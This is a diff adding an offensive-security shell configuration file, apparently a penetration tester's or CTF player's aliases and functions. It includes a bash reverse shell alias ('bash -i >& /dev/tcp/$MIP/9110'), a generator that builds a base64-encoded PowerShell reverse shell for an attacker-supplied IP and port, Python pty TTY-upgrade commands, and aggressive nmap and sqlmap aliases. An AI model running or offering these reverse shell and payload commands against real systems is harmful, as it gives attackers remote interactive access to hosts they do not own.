@@ -1,0 +1,47 @@
+function urldecode() { local i="${*//+/ }"; echo -e "${i//%/\\x}"; }
+
+# TODO i might need to look for a "simpler" & reliable one
+function urlencode() {
+    local string="${1}";local strlen=${#string};local encoded="";local pos c o
+
+    for (( pos=0 ; pos<strlen ; pos++ )); do
+        c=${string:$pos:1}
+        case "$c" in
+           [-_.~a-zA-Z0-9] ) o="${c}" ;;
+           * )               printf -v o '%%%02x' "'$c"
+        esac
+        encoded+="${o}"
+    done
+    echo "${encoded}"
+}
+
+# TTY upgrades
+py_tty_upgrade () {
+  echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
+}
+py3_tty_upgrade () {
+  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
+}
+alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip -sel clip"
+alias tty_fix="stty raw -echo; fg; reset"
+alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"
+
+gen_ps_rev () {
+  if [ "$#" -ne 2 ];
+    then
+      echo "[i] Usage: gen_ps_rev ip port"
+    else
+      SHELL=`cat ~/shared/shells/ps_rev.txt | sed s/x.x.x.x/$1/g | sed s/yyyy/$2/g | iconv -f utf8 -t utf16le | base64 -w 0`
+      echo "powershell -ec $SHELL" | xclip -sel clip
+  fi
+}
+
+alias httpserver="python3 -m http.server $@"
+export MIP=$(ifconfig tun0 2>/dev/null | grep inet | awk '{print $2}' | head -n1)
+alias mip="echo $MIP"
+alias reverse_shell="echo -n 'bash -c \"bash -i >& /dev/tcp/$MIP/9110 0>&1\"' | xclip -sel clip"
+alias scan="nmap -p- --min-rate=10000 -sCV -oN scans/full-scan.nmap -vvv $1"
+alias sqlreq="sqlmap -r $PWD/$@ --batch"
+alias ww='cd /opt/share/www/'
+export WWW=/opt/shared/www/
+
